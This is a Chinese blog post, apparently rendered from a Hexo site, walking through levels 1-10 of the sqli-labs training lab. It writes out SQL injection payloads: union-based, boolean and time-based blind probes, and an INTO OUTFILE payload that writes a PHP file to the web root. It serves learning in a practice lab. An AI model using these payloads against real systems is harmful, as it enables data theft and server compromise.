@@ -1,0 +1,713 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/ar.jpg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/ar.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/ar.jpg">
+  <link rel="mask-icon" href="/images/ar.jpg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"0w0.host","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"hide","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="Sqli-lab 过关笔记 Less 1-Less 10">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-lab Less 1-Less 10">
+<meta property="og:url" content="http://0w0.host/2020/08/09/sqli-lab-Less-1-Less-10/index.html">
+<meta property="og:site_name" content="Sunr&#39;s Blog">
+<meta property="og:description" content="Sqli-lab 过关笔记 Less 1-Less 10">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-08-09T15:56:10.000Z">
+<meta property="article:modified_time" content="2020-09-10T14:09:05.974Z">
+<meta property="article:author" content="Sunr">
+<meta property="article:tag" content="笔记">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="sqli-lab">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://0w0.host/2020/08/09/sqli-lab-Less-1-Less-10/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>sqli-lab Less 1-Less 10 | Sunr's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Sunr's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Sunr's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://0w0.host/2020/08/09/sqli-lab-Less-1-Less-10/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/ar.jpg">
+      <meta itemprop="name" content="Sunr">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sunr's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          sqli-lab Less 1-Less 10
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-08-09 23:56:10" itemprop="dateCreated datePublished" datetime="2020-08-09T23:56:10+08:00">2020-08-09</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-09-10 22:09:05" itemprop="dateModified" datetime="2020-09-10T22:09:05+08:00">2020-09-10</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/2020/08/09/sqli-lab-Less-1-Less-10/" class="post-meta-item leancloud_visitors" data-flag-title="sqli-lab Less 1-Less 10" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2020/08/09/sqli-lab-Less-1-Less-10/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/08/09/sqli-lab-Less-1-Less-10/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.7k</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="Sqli-lab-过关笔记-Less-1-Less-10"><a href="#Sqli-lab-过关笔记-Less-1-Less-10" class="headerlink" title="Sqli-lab 过关笔记 Less 1-Less 10"></a>Sqli-lab 过关笔记 Less 1-Less 10</h1><a id="more"></a>
+<h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><p>首先加单引号查看其报错信息</p>
+<p><code>&#39;1&#39;&#39; LIMIT 0,1</code></p>
+<p>根据报错的语句可以推测大概sql的查询语句是</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> ID <span class="operator">=</span> <span class="string">&#x27;id&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>可见是单引号闭合的查询语句，由此就可以构造注入的语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; UNION SELECT 1,database(),3 --+</span></span><br></pre></td></tr></table></figure>
+<p>便可以进行下一步注入</p>
+<hr>
+<h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p>加单引号显示报错 </p>
+<p> <code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;\&#39; LIMIT 0,1&#39; at line 1</code></p>
+<p>而sql语句的报错信息是  <code>\&#39; LIMIT 0,1</code><br>人为用”&quot;告诉编译器换行<br>而一般的查询语句大致就是  </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> ID <span class="operator">=</span> id</span><br><span class="line">LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>输入<code>&#39;</code>后出现语法错误报错使语句变成</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="keyword">USER</span> <span class="keyword">WHERE</span> ID <span class="operator">=</span> id</span><br><span class="line"><span class="string">&#x27;LIMIT 0,1 #单引号未被闭合</span></span><br></pre></td></tr></table></figure>
+<p>所以后加入注释<code>#</code>或<code>--+</code>或<code>--%20</code>后</p>
+<p>则返回正常，此时语句是</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> USERNAME,PASSWD <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> ID <span class="operator">=</span> id</span><br><span class="line"># LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>而后面知道了出现<code>\</code>，这是php自动开了<code>&#39;</code> 的转义，具体怎么关闭可以看我的另一篇笔记</p>
+<hr>
+<h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p>加单引号后报错信息是<br><code>&#39;1&#39;&#39;) LIMIT 0,1</code></p>
+<p>去掉一个单引号后变成<br><code>&#39;1&#39;) LIMIT 0,1</code></p>
+<p>可以推测是由小括号闭合的查询语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USRES <span class="keyword">WHERE</span> ID <span class="operator">=</span> (<span class="string">&#x27;id&#x27;</span>) LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>闭合单引号加括号后连接注入语句，成功回显</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27;) union select 1,database(),3 --+</span></span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p>加单引号，括号皆返回正常<br>加双引号后爆出错误<br><code>&quot;1&quot;&quot;) LIMIT 0,1</code></p>
+<p>去掉一个双引号<br><code>&quot;1&quot;) LIMIT 0,1</code></p>
+<p>可以推测这是由双引号和括号闭合的查询语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> ID <span class="operator">=</span> (&quot;id&quot;) LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>闭合语句后插入注入语句,成功回显</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span>&quot;) UNION SELECT 1,database(),3 --+</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p>开局就是<code>You are in ...</code><br>这是盲注关卡了，首先单引号探路<br><code>&#39;1&#39;&#39; LIMIT 0,1</code><br>去掉一个单引号后可以推知查询语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> ID <span class="operator">=</span> <span class="string">&#x27;id&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>之后闭合语句注入，回显正常结果为true</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length(database())=8 --+</span></span><br></pre></td></tr></table></figure>
+<p>验证成功，扔Sqlmap</p>
+<hr>
+<h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p>加上单引号小括号没反应，双引号报错</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;1&quot;&quot; LIMIT 0,1</span><br></pre></td></tr></table></figure>
+<p>去掉一个双引号可推知查询语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> ID <span class="operator">=</span> &quot;id&quot; LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>闭合语句后插入注入语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot; AND LENGTH(DATABASE())=8 --+</span><br></pre></td></tr></table></figure>
+<p>验证成功，扔sqlmap</p>
+<hr>
+<h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><p>单引号探路扔出错误<br><code>You have an error in your SQL syntax</code><br>扔出双引号单括号回显正常</p>
+<p>用<code>&#39; --+</code>试图闭合爆出<br><code>You have an error in your SQL syntax</code></p>
+<p>用<code>&#39;) --+</code>试图闭合爆出<br><code>You have an error in your SQL syntax</code></p>
+<p>用<code>&#39;)) --+</code> 回显正常，闭合成功</p>
+<p>由此可以推知查询语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> ID <span class="operator">=</span> ((<span class="string">&#x27;id&#x27;</span>)) LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>闭合引号验证</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) AND LENGTH(DATABASE())=8 --+</span></span><br></pre></td></tr></table></figure>
+<p>回显正常</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) AND ASCII(SUBSTR(DATABASE(),1,1)))=116 --+</span></span><br></pre></td></tr></table></figure>
+<p>这样猜解又错误</p>
+<p>然后突然注意到一直被忽略的标题<br><code>Dump into outfile</code><br>原来这才是考察的内容</p>
+<p>然后查了一下mysql outfile的相关内容<br>发现是一个导出查询内容文件的函数，于是去构造注入语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) union select 1,&#x27;</span><span class="operator">&lt;</span>?php phpinfo();?<span class="operator">&gt;</span><span class="string">&#x27;,3 into outfile &#x27;</span>C:\\phpStudy2016\\WWW\\sqli\\Less<span class="number">-7</span>\\<span class="number">1.</span>php<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>
+<p>这里写文件的话需要</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root以及更高权限</span><br><span class="line">secure_file_priy不为<span class="keyword">NULL</span></span><br><span class="line"><span class="keyword">set</span> globle general_log <span class="operator">=</span> <span class="keyword">on</span></span><br></pre></td></tr></table></figure>
+<p>后才可以正常写入</p>
+<hr>
+<h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><p>日常单引号开路无回显，双引号小括号均正常<br>闭合单引号后正常，即可推知查询语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> ID <span class="operator">=</span> <span class="string">&#x27;id&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>构造闭合语句注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND LENGTH(DATABASE()) &gt; 0 --+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">AND</span> SUBSTR(DATABASE(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;s&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p>回显正常，验证成功，扔sqlmap</p>
+<hr>
+<h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><p>常规单引号探测，发现无论是单引号双引号还是小括号都回显正常</p>
+<p>在单引号后接<code>AND 1=2 --+</code>，双引号小括号同上都返回正常<br>说明不是bool型盲注</p>
+<p>用<code>AND SLEEP(5) --+</code>接在后探测<br>发现只有单引号触发SLEEP效果由此可推测查询语句是</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> ID <span class="operator">=</span> <span class="string">&#x27;id&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>由此可闭合构造语句验证</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND IF(LENGTH(DATABASE())&gt;0,SLEEP(3),1) --+</span></span><br></pre></td></tr></table></figure>
+<p>延时成功验证，扔sqlmap</p>
+<hr>
+<h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><p>同样是对闭合方法进行测试<br>直接回显正常，bool方法回显正常<br>则构造sleep进行验证</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot; AND SLEEP(2) --+</span><br></pre></td></tr></table></figure>
+<p>成功延时，可推测查询语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> ID <span class="operator">=</span>&quot;id&quot;</span><br></pre></td></tr></table></figure>
+<p>进行闭合后插入注入验证</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot; AND IF(LENGTH(DATABASE())&gt;0,SLEEP(3),1) --+</span><br></pre></td></tr></table></figure>
+<p>验证成功，扔sqlmap</p>
+<hr>
+
+    </div>
+
+    <div>
+      
+      <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+      
+    </div>
+
+    
+    
+    
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag"><i class="fa fa-tag"></i> 笔记</a>
+              <a href="/tags/%E6%B8%97%E9%80%8F/" rel="tag"><i class="fa fa-tag"></i> 渗透</a>
+              <a href="/tags/sqli-lab/" rel="tag"><i class="fa fa-tag"></i> sqli-lab</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/03/05/Cockpit-For-RHEL8/" rel="prev" title="Cockpit For RHEL8">
+      <i class="fa fa-chevron-left"></i> Cockpit For RHEL8
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/08/11/%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97%E7%AC%94%E8%AE%B0/" rel="next" title="过安全狗笔记">
+      过安全狗笔记 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Sqli-lab-%E8%BF%87%E5%85%B3%E7%AC%94%E8%AE%B0-Less-1-Less-10"><span class="nav-number">1.</span> <span class="nav-text">Sqli-lab 过关笔记 Less 1-Less 10</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-1"><span class="nav-number">1.1.</span> <span class="nav-text">Less-1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-2"><span class="nav-number">1.2.</span> <span class="nav-text">Less-2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-3"><span class="nav-number">1.3.</span> <span class="nav-text">Less-3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-4"><span class="nav-number">1.4.</span> <span class="nav-text">Less-4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-5"><span class="nav-number">1.5.</span> <span class="nav-text">Less-5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-6"><span class="nav-number">1.6.</span> <span class="nav-text">Less-6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-7"><span class="nav-number">1.7.</span> <span class="nav-text">Less-7</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-8"><span class="nav-number">1.8.</span> <span class="nav-text">Less-8</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-9"><span class="nav-number">1.9.</span> <span class="nav-text">Less-9</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-10"><span class="nav-number">1.10.</span> <span class="nav-text">Less-10</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Sunr"
+      src="/images/ar.jpg">
+  <p class="site-author-name" itemprop="name">Sunr</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/sunr0" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;sunr0" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:a7k6b1c@163.com" title="E-Mail → mailto:a7k6b1c@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="http://wpa.qq.com/msgrd?v=3&uin=865142767&site=qq&menu=yes" title="QQ → http:&#x2F;&#x2F;wpa.qq.com&#x2F;msgrd?v&#x3D;3&amp;uin&#x3D;865142767&amp;site&#x3D;qq&amp;menu&#x3D;yes" rel="noopener" target="_blank"><i class="fab fa-qq fa-fw"></i>QQ</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Sunr</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">31k</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
